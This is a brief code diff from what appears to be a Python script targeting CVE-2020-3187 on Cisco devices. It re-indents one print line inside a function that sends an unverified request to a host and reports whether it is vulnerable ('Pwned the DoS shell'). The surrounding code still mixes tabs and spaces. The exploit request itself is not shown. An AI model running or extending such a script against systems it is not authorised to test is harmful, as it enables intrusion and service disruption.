@@ -80,7 +80,7 @@ def cve_2020_3187(host, port):
     r = request.get(url, verify=False)
 	
     if r.status_code != 200:
-	print('The host %s is not vulnerable to CVE-2020-3187' % host)
+        print('The host %s is not vulnerable to CVE-2020-3187' % host)
     else:
 	print('Pwned the DoS shell of %s' % host)
 	print('')
